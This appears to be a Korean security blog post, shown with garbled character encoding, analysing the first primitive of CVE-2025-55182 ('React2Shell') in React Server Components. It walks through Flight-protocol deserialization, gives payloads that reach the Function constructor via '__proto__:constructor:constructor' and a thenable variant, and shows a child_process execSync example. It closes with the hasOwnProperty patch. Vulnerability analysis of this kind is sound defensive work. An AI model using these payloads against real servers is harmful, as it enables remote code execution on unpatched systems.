---
title: "React2Shell ë¶„ì„ - Part 1: PRIMITIVE #1 (2/3)"
author: P0LESTAR
date: 2025-12-21 00:01:01 +0800
categories: [CVE, 1-dayë¶„ì„]
tags: [CVE, CVE-2025-55182, react2shell, 1-dayë¶„ì„]
#pin: true
sitemap:
  changefreq: monthly
  priority: 0.5
---

## ê°œìš”
2025ë…„ 12ì›”ì— ë°œê²¬ëœ `RSC`(React Server Components)ì˜ `React2Shell` ì·¨ì•½ì `CVE-2025-55182`ì€ `Flight í”„ë¡œí† ì½œ` í˜ì´ë¡œë“œë¥¼ ì„œë²„ ì¸¡ì—ì„œ ì—­ì§ë ¬í™” ì‹œ ì•ˆì „í•˜ì§€ ì•Šì€ ê²€ì¦ìœ¼ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” RCE ì·¨ì•½ì ì…ë‹ˆë‹¤.

ì¦‰, í´ë¼ì´ì–¸íŠ¸ì—ì„œ ì„œë²„ë¡œ ë³´ë‚¸ Flight í”„ë¡œí† ì½œ í˜ì´ë¡œë“œì— ëŒ€í•œ ê²€ì¦ì´ ì™„ì „í•˜ì§€ ì•Šì•„ ë°œìƒí•œ ë¬¸ì œì…ë‹ˆë‹¤.

ì´ ê³µê²©ì— ëŒ€í•œ í•µì‹¬ ì·¨ì•½ì ì„ í¬ê²Œ ì„¸ ê°€ì§€ë¡œ êµ¬ë¶„í•  ìˆ˜ ìˆìœ¼ë©°, ì „ì²´ ê³µê²©ì€ ì„¸ ì·¨ì•½ì ì˜ ì—°ê³„ë¡œ ì™„ì„±ë©ë‹ˆë‹¤.

<br>

---


1. **PRIMITIVE #1**: Prototype Pollutionì„ í†µí•œ Function ìƒì„±ì ì ‘ê·¼
2. **PRIMITIVE #2**: `initializeModelChunk()` ê°•ì œ í˜¸ì¶œ
3. **Call Gadget**: Blob ì²˜ë¦¬ë¥¼ í†µí•œ Function ì‹¤í–‰

ì´ ê¸€ì—ì„œëŠ” ë¨¼ì € **PRIMITIVE #1**ê¹Œì§€ ë‹¤ë£¨ê² ìŠµë‹ˆë‹¤

---

## Flight í”„ë¡œí† ì½œ ì—­ì§ë ¬í™” ê³¼ì •

### í´ë¼ì´ì–¸íŠ¸ê°€ ì„œë²„ë¡œ ë³´ë‚´ëŠ” ë°ì´í„°

```javascript
files = {
    "0": '["$1"]',                                              // Chunk 0: ë°°ì—´, $1 ì°¸ì¡°
    "1": '{"object":"fruit","name":"$2:fruitName"}',           // Chunk 1: ê°ì²´, $2ì˜ fruitName ì°¸ì¡°
    "2": '{"fruitName":"cherry"}',                              // Chunk 2: ì‹¤ì œ ë°ì´í„°
}
```

### ì„œë²„ì—ì„œ ì—­ì§ë ¬í™” ê³¼ì •

**1ë‹¨ê³„: Chunk 0 íŒŒì‹±**

```javascript
// "$1" ë°œê²¬ â†’ Chunk 1ë¡œ ì´ë™
```

**2ë‹¨ê³„: Chunk 1 íŒŒì‹±**

```javascript
{
  object: "fruit",
  name: "$2:fruitName"  // Chunk 2ì˜ fruitName í•„ë“œ ì°¸ì¡°
}
```

**3ë‹¨ê³„: Chunk 2ì—ì„œ fruitName ê°€ì ¸ì˜¤ê¸°**

```javascript
chunk2 = { fruitName: "cherry" }
value = chunk2["fruitName"]  // "cherry"
```

**ìµœì¢… ê²°ê³¼:**

```javascript
{ object: 'fruit', name: 'cherry' }
```

ì´ì²˜ëŸ¼ Flight í”„ë¡œí† ì½œì€ Chunk ê°„ ì°¸ì¡°ë¥¼ í†µí•´ ë³µì¡í•œ ë°ì´í„° êµ¬ì¡°ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

---

## PRIMITIVE #1: Prototype Pollutionì„ í†µí•œ Function ì ‘ê·¼

### ì·¨ì•½ì : hasOwnProperty ê²€ì‚¬ ì—†ìŒ

**íŒ¨ì¹˜ ì „ ì½”ë“œ:**

```javascript
// getOutlinedModel í•¨ìˆ˜ ë‚´ë¶€
const path = reference.split(':');  // "$2:fruitName" â†’ ["2", "fruitName"]
let value = chunk;

for (let i = 1; i < path.length; i++) {
  value = value[path[i]];  // âŒ ê²€ì‚¬ ì—†ì´ ê·¸ëƒ¥ ì ‘ê·¼
}
```

### ì´ê²Œ ì™œ ë¬¸ì œì¸ê°€?

JavaScript ê°ì²´ëŠ” ìì‹ ì˜ ì†ì„±ë¿ ì•„ë‹ˆë¼ **í”„ë¡œí† íƒ€ì… ì²´ì¸ì˜ ì†ì„±**ë„ ì ‘ê·¼ ê°€ëŠ¥í•©ë‹ˆë‹¤:

```javascript
const obj = { fruitName: "cherry" };

// ì¼ë°˜ ì ‘ê·¼
obj["fruitName"]        // "cherry" âœ…
obj["toString"]         // [Function] (ìƒì†ë°›ì€ ë©”ì„œë“œ) âš ï¸
obj["__proto__"]        // Object.prototype âš ï¸
obj["constructor"]      // [Function: Object] âš ï¸
```

> **í•µì‹¬ ë¬¸ì œ**: `hasOwnProperty` ê²€ì‚¬ê°€ ì—†ì–´ì„œ `__proto__`, `constructor` ê°™ì€ í”„ë¡œí† íƒ€ì… ì†ì„±ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{: .prompt-danger }

---

## ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ #1: Function ìƒì„±ì ì ‘ê·¼

### ê³µê²© í˜ì´ë¡œë“œ

```javascript
files = {
    "0": '["$1:__proto__:constructor:constructor"]',
    "1": '{"x":1}'
}
```

### ì—­ì§ë ¬í™” ê³¼ì • ìƒì„¸ ë¶„ì„

**Step 1: Chunk 0 íŒŒì‹±**

```javascript
// ë°°ì—´ ìƒì„±, "$1:__proto__:constructor:constructor" ì°¸ì¡° ë°œê²¬
```

**Step 2: ê²½ë¡œ ë¶„ë¦¬**

```javascript
reference = "$1:__proto__:constructor:constructor"
path = reference.split(":")
// ["1", "__proto__", "constructor", "constructor"]
```

**Step 3: Chunk 1 ê°€ì ¸ì˜¤ê¸°**

```javascript
chunk1 = { x: 1 }
```

**Step 4: ê²½ë¡œ ë”°ë¼ê°€ê¸° (ì·¨ì•½ì  ë°œìƒ)**

```javascript
let value = chunk1;               // { x: 1 }

// ì²« ë²ˆì§¸ ê²½ë¡œ: "__proto__"
value = value["__proto__"];       // Object.prototype

// ë‘ ë²ˆì§¸ ê²½ë¡œ: "constructor"
value = value["constructor"];     // [Function: Object]

// ì„¸ ë²ˆì§¸ ê²½ë¡œ: "constructor"
value = value["constructor"];     // [Function: Function] ğŸ’€
```

**ìµœì¢… ê²°ê³¼:**

```javascript
[Function: Function]  // Function ìƒì„±ì íšë“
```

### JavaScript í”„ë¡œí† íƒ€ì… ì²´ì¸ ì´í•´

```
{ x: 1 }
   â†“ __proto__
Object.prototype
   â†“ constructor
[Function: Object]
   â†“ constructor
[Function: Function] ğŸ’€
```

ëª¨ë“  ì¼ë°˜ ê°ì²´ â†’ `Object.prototype` â†’ `Object` ìƒì„±ì â†’ `Function` ìƒì„±ìë¡œ ì´ì–´ì§€ëŠ” ì²´ì¸ì„ ë”°ë¼ê°‘ë‹ˆë‹¤.

---

## Function ìƒì„±ìì˜ ìœ„í—˜ì„±

Function ìƒì„±ìë¥¼ ì–»ìœ¼ë©´ **ë¬¸ìì—´ë¡œ ëœ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```javascript
const FunctionConstructor = Function;

// ì˜ˆì‹œ 1: ê°„ë‹¨í•œ ì½”ë“œ ì‹¤í–‰
FunctionConstructor('return 1 + 1')()  // 2

// ì˜ˆì‹œ 2: process ê°ì²´ ì ‘ê·¼
FunctionConstructor('return process')()  // process ê°ì²´

// ì˜ˆì‹œ 3: íŒŒì¼ ì‹œìŠ¤í…œ ì ‘ê·¼
FunctionConstructor('return require("fs")')()

// ì˜ˆì‹œ 4: ì›ê²© ì½”ë“œ ì‹¤í–‰ (RCE)
FunctionConstructor('return require("child_process").execSync("whoami")')()
```

> **ì£¼ì˜**: Function ìƒì„±ìëŠ” `eval()`ê³¼ ìœ ì‚¬í•˜ê²Œ ì„ì˜ì˜ JavaScript ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆì–´ ë§¤ìš° ìœ„í—˜í•©ë‹ˆë‹¤.
{: .prompt-danger }

---

## ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ #2: thenì„ Functionìœ¼ë¡œ ì„¤ì •

### ë°°ê²½ ì§€ì‹: Thenable ê°ì²´

JavaScriptì—ì„œ ê°ì²´ì— `then` ë©”ì„œë“œê°€ ìˆìœ¼ë©´ **Promiseì²˜ëŸ¼ ì·¨ê¸‰**ë©ë‹ˆë‹¤:

```javascript
const obj = {
  then: function(resolve) {
    resolve("ê²°ê³¼");
  }
};

// Promiseë¡œ ì¸ì‹ë¨
await obj;  // "ê²°ê³¼"
```

ì´ë¥¼ "Thenable" ê°ì²´ë¼ê³  í•©ë‹ˆë‹¤.

### ê³µê²© í˜ì´ë¡œë“œ

```javascript
files = {
    "0": '{"then": "$1:__proto__:constructor:constructor"}',
    "1": '{"x":1}'
}
```

### ì—­ì§ë ¬í™” ê³¼ì •

**Step 1: Chunk 0 íŒŒì‹±**

```javascript
{
  then: "$1:__proto__:constructor:constructor"  // Function ìƒì„±ì ì°¸ì¡°
}
```

**Step 2: then ê°’ í•´ì„**

```javascript
// PRIMITIVE #1ê³¼ ë™ì¼í•œ ê²½ë¡œ íƒìƒ‰
chunk0.then = Function  // ğŸ’€
```

**Step 3: Next.jsì—ì„œ ì´ ê°ì²´ë¥¼ await**

```javascript
// action-handler.ts (Next.js ë‚´ë¶€)
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)
```

**Step 4: awaitê°€ then í˜¸ì¶œ**

```javascript
// JavaScript await ë‚´ë¶€ ë™ì‘
if (typeof obj.then === 'function') {
  obj.then(resolve, reject);  // thenì´ í•¨ìˆ˜ë©´ í˜¸ì¶œ
}

// ì‹¤ì œë¡œëŠ”:
Function(resolve, reject);  // Function ìƒì„±ìê°€ í˜¸ì¶œë¨
```

### ë°œìƒí•˜ëŠ” ì—ëŸ¬

```
SyntaxError: Unexpected token 'function'
    at Object.Function [as then] (<anonymous>) {
      digest: '1259793845'
    }
```

**ì™œ ì—ëŸ¬ê°€ ë°œìƒí•˜ë‚˜?**

```javascript
// V8 ì—”ì§„ì˜ ë‚´ë¶€ í•¨ìˆ˜ë“¤
resolve  // function () { [native code] }
reject   // function () { [native code] }

// Function ìƒì„±ìê°€ ì´ë ‡ê²Œ í•´ì„ ì‹œë„:
Function('resolve', 'function () { [native code] }')
// = function(resolve) { function () { [native code] } }  // âŒ ë¬¸ë²• ì˜¤ë¥˜
```

> ì´ ì—ëŸ¬ ìì²´ëŠ” ê³µê²© ì‹¤íŒ¨ì§€ë§Œ, **Function ìƒì„±ìì— ì ‘ê·¼ ê°€ëŠ¥í•¨ì„ ì¦ëª…**í•©ë‹ˆë‹¤.
{: .prompt-info }

---

## PRIMITIVE #1 ì •ë¦¬

### ì·¨ì•½ì  ìš”ì•½

```
[í•µì‹¬ ì·¨ì•½ì ]
hasOwnProperty ê²€ì‚¬ ì—†ì´ obj[key] ì ‘ê·¼

â†“

[ê³µê²© ê²½ë¡œ]
$1:__proto__:constructor:constructor

â†“

[íšë“ ê°€ëŠ¥í•œ ê²ƒ]
Function ìƒì„±ì

â†“

[ë‹¤ìŒ ë‹¨ê³„]
Functionì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²• í•„ìš”
â†’ PRIMITIVE #2ë¡œ ì´ì–´ì§
```

### PRIMITIVE #1ì˜ í•œê³„

- âœ… Function ìƒì„±ìì— **ì ‘ê·¼ ê°€ëŠ¥**
- âŒ Functionì„ **ì‹¤í–‰í•˜ì§€ëŠ” ëª»í•¨**
- âŒ ë‹¨ë…ìœ¼ë¡œëŠ” RCE ë¶ˆê°€ëŠ¥

Function ìƒì„±ìë¥¼ ì–»ì—ˆì§€ë§Œ, ì´ë¥¼ **ì‹¤ì œë¡œ ì‹¤í–‰**í•˜ë ¤ë©´ ì¶”ê°€ ê¸°ë²•ì´ í•„ìš”í•©ë‹ˆë‹¤.

ë‹¤ìŒ ê¸€ì—ì„œëŠ” **PRIMITIVE #2**ë¥¼ í†µí•´ `initializeModelChunk()`ë¥¼ ê°•ì œ í˜¸ì¶œí•˜ì—¬ Functionì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ë´…ë‹ˆë‹¤.

---

## íŒ¨ì¹˜ ë‚´ìš©

### ì·¨ì•½ì  ìˆ˜ì •

```javascript
// íŒ¨ì¹˜ ì „
export function requireModule<T>(metadata: ClientReference<T>): T {
  const moduleExports = parcelRequire(metadata[ID]);
  return moduleExports[metadata[NAME]];  // âŒ ê²€ì‚¬ ì—†ìŒ
}

// íŒ¨ì¹˜ í›„
export function requireModule<T>(metadata: ClientReference<T>): T {
  const moduleExports = parcelRequire(metadata[ID]);
  if (hasOwnProperty.call(moduleExports, metadata[NAME])) {  // âœ… ê²€ì‚¬ ì¶”ê°€
    return moduleExports[metadata[NAME]];
  }
  return (undefined: any);
}
```

### íŒ¨ì¹˜ ì›ë¦¬

`hasOwnProperty` ì²´í¬ë¥¼ ì¶”ê°€í•˜ì—¬:
- ê°ì²´ê°€ **ì§ì ‘ ê°€ì§„ ì†ì„±**ë§Œ ì ‘ê·¼ í—ˆìš©
- `__proto__`, `constructor` ê°™ì€ í”„ë¡œí† íƒ€ì… ì²´ì¸ ì†ì„± ì°¨ë‹¨

```javascript
const obj = { x: 1 };

obj.hasOwnProperty('x');           // true âœ…
obj.hasOwnProperty('__proto__');   // false âŒ
obj.hasOwnProperty('constructor'); // false âŒ
```

---

## ë‹¤ìŒ ê¸€

PRIMITIVE #1ì—ì„œ Function ìƒì„±ìì— ì ‘ê·¼í–ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì´ê²ƒë§Œìœ¼ë¡œëŠ” RCEê°€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.

**PRIMITIVE #2**ì—ì„œëŠ”:
- `$@0` ìê¸° ì°¸ì¡° íŠ¸ë¦­
- `Chunk.prototype.then` ì•…ìš©
- `initializeModelChunk()` ê°•ì œ í˜¸ì¶œ
- **Functionì„ ì‹¤ì œë¡œ ì‹¤í–‰í•˜ëŠ” ë°©ë²•**

---



## ì°¸ê³ 

<https://velog.io/@xxziiko/RSC>

<https://mycodings.fly.dev/blog/2025-01-20-rsc-tutorial-1-react-server-components-explained/>

<https://github.com/msanft/CVE-2025-55182>

<https://www.enki.co.kr/media-center/blog/complete-analysis-of-the-react2shell-cve-2025-55182-vulnerability>

<https://asec.ahnlab.com/ko/91660/>

<https://www.trendmicro.com/ko_kr/research/25/l/CVE-2025-55182-analysis-poc-itw.html>